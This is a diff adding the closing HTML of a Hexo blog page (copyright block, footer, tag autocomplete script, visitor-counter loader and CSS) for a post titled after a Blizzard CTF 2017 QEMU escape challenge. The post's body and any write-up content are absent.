+    <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-03-04, 20:19:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-09, 22:29:27</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/Q之逃逸-壹之型-Blizzard-CTF-2017-Strng/" title="Q之逃逸-壹之型-Blizzard-CTF-2017-Strng">http://tianstcht.github.io/Q之逃逸-壹之型-Blizzard-CTF-2017-Strng/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 t1an5t</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#ctf','#pwnable','#2019','#reverse','#writeup','#qemu','#elf','#kernel','#pwntools','#glibc','#tw',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
